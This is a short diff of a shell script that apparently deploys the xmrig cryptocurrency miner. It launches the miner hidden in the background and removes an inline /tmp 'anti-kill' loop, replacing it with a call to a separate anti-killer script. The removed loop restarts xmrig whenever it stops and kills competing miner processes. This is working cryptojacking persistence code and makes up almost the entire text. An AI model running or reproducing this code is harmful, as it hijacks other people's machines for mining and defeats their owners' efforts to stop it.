@@ -37,19 +37,5 @@ sed -i "s/kasm/kasm-$randnum/g" config.json
 
 nohup ./xmrig > /dev/null 2>&1 &
 
-# Anti-Kill Script
-cd /tmp
-cat <<EOF > anti-kill.sh
-#!/bin/bash
-while true; do
-    if ! pgrep xmrig >/dev/null; then
-        nohup /tmp/xmrig/xmrig-$xmrver/xmrig > /dev/null 2>&1 &
-    fi
-    pkill -f minerd
-    pkill -f crypto
-    pkill -f xmrig
-    sleep 10
-done
-EOF
-chmod +x anti-kill.sh
-nohup bash anti-kill.sh > /dev/null 2>&1 &
+# Start Anti-Kill Protection
+nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &
